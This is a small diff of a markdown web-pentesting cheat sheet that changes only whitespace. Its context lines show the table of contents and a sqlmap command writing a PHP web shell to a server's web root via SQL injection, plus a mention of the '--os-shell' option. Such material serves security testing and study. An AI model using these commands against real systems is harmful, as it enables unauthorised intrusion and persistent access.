@@ -27,7 +27,7 @@ For those who can't afford burp pro or cheapskates thogh you can't take an actua
 [Insecure Deserialization](#Insecure_Deserialization)  
 
 [Common Payloads](#Common-Payloads-and-Commands)  
-[Tools](#Tools)
+[Tools](#Tools)  
 [Wordlists](#Wordlists)  
 
 ---
@@ -706,6 +706,7 @@ Writing files:
 sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 ```
 You could use `--os-shell` to open a shell.
+
 
 ## Wordlists
 
